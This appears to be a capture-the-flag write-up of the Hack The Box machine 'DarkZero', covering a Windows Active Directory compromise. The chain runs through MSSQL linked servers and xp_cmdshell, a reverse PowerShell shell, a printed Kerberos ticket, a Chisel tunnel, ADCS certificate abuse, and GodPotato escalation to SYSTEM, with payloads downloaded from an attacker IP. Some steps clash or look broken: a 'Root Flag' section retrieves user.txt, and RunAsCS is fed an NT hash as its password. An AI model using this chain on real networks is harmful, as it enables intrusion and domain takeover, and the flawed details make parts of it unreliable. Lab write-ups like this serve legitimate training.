# HTB: DarkZero

## Overview

DarkZero is an assume breach Windows box with two forests connected by a bidirectional cross-forest trust. Starting with given credentials, I'll enumerate MSSQL on DC01 and find a linked server to DC02 in the other forest where the mapped account is sysadmin. After enabling xp_cmdshell on DC02 to get a shell as the SQL service account, I'll escalate to SYSTEM using the ADCS certificate enrollment and RunAsCS technique.

## Initial Access

### Provided Credentials

HackTheBox provides the following credentials:
- Username: `john.w`
- Password: `RFulUtONCOL!`

These credentials work for SMB, LDAP, and MSSQL authentication.

### MSSQL Enumeration

Connected to MSSQL using `mssqlclient.py`:
```
mssqlclient.py darkzero.htb/john.w:'RFulUtONCOL!'@DC01.darkzero.htb -windows-auth
```

Enumerating linked servers revealed a cross-forest trust:
```
SQL (darkzero\john.w  guest@master)> enum_links
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      
DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      
Linked Server       Local Login       Is Self Mapping   Remote Login   
DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc
```

The `dc01_sql_svc` account has sysadmin privileges on the linked server:
```
SQL (darkzero\john.w  guest@master)> EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [DC02.darkzero.ext]
1
```

### Shell as svc_sql

After switching context to the remote server and enabling xp_cmdshell:
```
SQL (darkzero\john.w  guest@master)> use_link [DC02.darkzero.ext]
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> enable_xp_cmdshell
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> xp_cmdshell whoami
output                 
darkzero-ext\svc_sql   
NULL
```

I executed a PowerShell reverse shell to get an interactive session:
```
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> xp_cmdshell powershell -e [base64_encoded_payload]
```

## Privilege Escalation Strategy

The goal is to escalate from the `svc_sql` account to SYSTEM on DC02. The approach involves:

1. Obtaining a TGT (Ticket Granting Ticket) for the `svc_sql` account
2. Using the TGT with ADCS (Active Directory Certificate Services) to request a certificate
3. Using the certificate to authenticate and get the NT hash
4. Using RunAsCS to start a process with service logon privileges
5. Escalating to SYSTEM using the SeImpersonatePrivilege

### Step 1: Obtain TGT for svc_sql

Upload Rubeus to the target and use the `tgtdeleg` command to request a delegation TGT:

```
PS C:\programdata> .\rubeus.exe tgtdeleg /nowrap

[*] Action: Request Fake Delegation TGT (current user)
[*] base64(ticket.kirbi):
      doIFgDCCBXygAwIBBaEDAgEWooIEhjCCBIJhggR+MIIEeqADAgEFoQ4bDERBUktaRVJPLkVYVKIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uRVhUo4IEPjCCBDqgAwIBEqEDAgECooIELASCBCiLZe6eocJ3vNsNxfQIypweP8Duishm4lAX3tfdOjkYheVKmz5xM03/ZGwTVixZ+cDfRpaWtsk9TM3lGlzu4gF9rfHxnEMgtXLlYa/67euJ5c650ASw2I4P4COybBdwsnv/dVDyMwgdZT8usC8YWKYlh5kftTJ42SFDSwK/+xhoVsdfC3kg0Q/aazrPh7S2j/kKm5VcO7ibD0Ed9TlTse1Ak2hGxsF8OuL1b4yyhE7LGKrxiiAev4YLBL118MZYEojNfgyVFvW17eABCxwtQexwBRGlu0VKA98n8z9dz/1+LqkJHADu7PgpN9T3p1XV+BP/SMvjhhNwwynAQTngGSJBDchjpGjPpaeCrt7lt8g3YhiFlk0ghd7NpHUn6w+Hg+wcx5X18BfJBHrGkoMNntHEyZFbIEDrxIvGDGBFSIxDxqd/pMjtLrmZnrjs2xQnSqZUAgg3s1rb9RHSdxcFoVjGrIdRfcaOMkIFk1Ct4agKeVgqUzSdXGjvdehxaGKzMDRGyTic+mfqIT7+cjvfXfhPTccyejTzwE8plMTLRaTr4aYWrZYWevRmLKVVmN1RyNAXUbd71bbvLk7bjmezyvLCrKDBtDmeqbMkf2S7Z6amERV7QPmvTaVrZz5xD3ECXY+rR0/b36G89DMKGm0St/L5X2ySTD3rL7jl8LTlGKsOGaFTAFjQRhluZivpBvoeNybG/++l5Xw+MelRuZRPyr3zNvKGG3fh3Cgo9Tyq6m1uA82JWLnMWl3yqLVPkhthARSvYlWqPJBx2qq0qb/zWg0NPDAVu0LehQZTtC8oPT5mv8vWMddDCiPmwVTjPCupalhc2QKxN91gTpBabP9kPmhkMOmEszoWWEAaPOaWDSP6nnTp7U40qJk0Wvlh9L3YuzrerbqZryn9+E/cqU7WozwZakjND2mgggIrCmMMYlPJW+XJwb156TJDcBzZJW3VVTIfUanDUp/FLRC9MJ0Pecc2XMIihzb5Kg5nQat2WjFkWm49Fv1yuUnpM7ojzA7ySW86DDkZq7JnMzGwr83R25Hj6uLJUUACHb3/UvXD4SbF0YLcCK1caivPBvor2Wnje9277khWRTQY6iAe7S9kEgXTBYP/smumN9ObCoVl/D1UhUdHCpC0BoAFuNuZ3uQOqJdNAsD5DMH8VJXNQ8zOAiWUeCm3G8eRGzvgYMk6cWpEY1GyO7VxbglQVBj+dzAhelx+8OcMSYtF2h7UYMqekRj3XAzPX1K5XE8j1/Xc9WH7uuXkUpsoebmvzJu5iPB1uwzmRdOlKBFzC4AAUadN4hZmhVOzFmfgghAtvOZ/vejMg6KPii3vSH84f96K2/1heO0yKMpCZvmNbOzZ14FIqQjRDp7VxIYyIkLCaO4jFPK2739psUNHQxO2TDrCwcMQw7p9R2KqFZxZtqOB5TCB4qADAgEAooHaBIHXfYHUMIHRoIHOMIHLMIHIoCswKaADAgESoSIEICYIk3zSjTftEg7R+uLf8kasuIkty8pcjRX5WcpXJ3jAoQ4bDERBUktaRVJPLkVYVKIUMBKgAwIBAaELMAkbB3N2Y19zcWyjBwMFAGChAAClERgPMjAyNjAzMjkwMDU3MDBaphEYDzIwMjYwMzI5MTA0MTQwWqcRGA8yMDI2MDQwNTAwNDE0MFqoDhsMREFSS1pFUk8uRVhUqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5FWFQ=
```

Convert the Kirbi file to ccache format on the attacking machine:
```
echo [base64_ticket] | base64 -d > svc_sql.kirbi
ticketConverter.py svc_sql.kirbi svc_sql.ccache
```

### Step 2: Establish SOCKS Proxy

Upload Chisel to the target and create a reverse SOCKS proxy:

On the attacking machine:
```
./chisel server -p 8000 --reverse
```

On the target:
```
PS C:\programdata> .\c.exe client 10.10.14.61:8000 R:socks
```

This creates a SOCKS5 proxy on localhost:1080 that tunnels traffic through the target.

### Step 3: Request ADCS Certificate

First, identify the CA name using certutil:
```
SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> xp_cmdshell certutil
Entry 0: (Local)
  Name:                         "darkzero-ext-DC02-CA"
  Config:                       "DC02.darkzero.ext\darkzero-ext-DC02-CA"
```

Using the TGT through the SOCKS proxy, request a certificate for the `user` template:
```
KRB5CCNAME=svc_sql.ccache proxychains certipy req -u svc_sql -k -no-pass -dc-host DC02.darkzero.ext -target DC02.darkzero.ext -ca darkzero-ext-DC02-CA -template user

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Got certificate with UPN 'svc_sql@darkzero.ext'
[*] Saving certificate and private key to 'svc_sql.pfx'
```

### Step 4: Extract NT Hash from Certificate

Use the certificate to authenticate and get the TGT:
```
proxychains certipy auth -pfx svc_sql.pfx -domain darkzero.ext -dc-ip 172.16.20.2

[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'svc_sql.ccache'
```

The authentication reveals the NT hash for the `svc_sql` account. This hash can be used with RunAsCS.

### Step 5: Using RunAsCS for Service Logon

The `Policy_Backup.inf` file on DC02 shows that `svc_sql` has the `SeServiceLogonRight` privilege:

```
[Privilege Rights]
SeServiceLogonRight = *S-1-5-20,svc_sql,SQLServer2005SQLBrowserUser$DC02,...
```

This means the account can perform service logons, which preserve privileges like SeImpersonatePrivilege.

Upload RunAsCS.exe to the target:
```
PS C:\programdata> curl http://10.10.14.61/RunAsCS.exe -outfile RunAsCS.exe
```

Run a command with service logon type using the NT hash:
```
PS C:\programdata> .\RunAsCS.exe -u svc_sql -p [NTHASH] -d darkzero.ext -c "cmd.exe /c whoami"
```

### Step 6: Escalate to SYSTEM

With the service logon token that has SeImpersonatePrivilege, use GodPotato to escalate to SYSTEM:

```
PS C:\programdata> wget 10.10.14.61/GodPotato-NET4.exe -outfile gp.exe
PS C:\programdata> wget 10.10.14.61/shell.ps1 -outfile shell.ps1
```

Create a reverse shell script and run it with GodPotato:
```
PS C:\programdata> New-Win32Process -Commandline 'C:\programdata\gp.exe -cmd "powershell C:\programdata\shell.ps1 2>&1"' -token $token
```

The reverse shell connects back as SYSTEM:
```
oxdf@hacky$ nc -lnvp 444
Connection received on 10.129.5.34 62831

PS C:\Windows\system32> whoami
nt authority\system
```

## Root Flag

With SYSTEM access, retrieve the user flag:
```
PS C:\users\administrator\desktop> cat user.txt
9f4d14a2************************
```

## Key Technical Concepts

### Cross-Forest Trust
- DC01 in darkzero.htb has a bidirectional trust with DC02 in darkzero.ext
- The trust allows authentication across forests with proper permissions

### Linked Servers
- MSSQL linked servers enable querying across database instances
- The `dc01_sql_svc` account has sysadmin privileges on DC02's MSSQL instance
- This is mapped from the `john.w` account through the linked server configuration

### ADCS Certificate Enrollment
- Active Directory Certificate Services allows domain users to request certificates
- The `user` template is accessible by default to all domain users
- Certificates can be used for Kerberos authentication to obtain TGTs and NT hashes

### RunAsCS
- RunAsCS enables starting processes with different logon types
- Service logons (LOGON32_LOGON_SERVICE) preserve SeImpersonatePrivilege
- Service accounts typically have this privilege for legitimate impersonation needs

### GodPotato
- Exploits SeImpersonatePrivilege to escalate to SYSTEM
- Uses named pipe impersonation techniques

## Mitigation Recommendations

1. Restrict linked server permissions - Only allow necessary users access to linked servers
2. Implement principle of least privilege for service accounts
3. Review ADCS template permissions - Restrict enrollment to privileged templates
4. Monitor for unusual service logon events
5. Apply security patches to prevent known escalation techniques
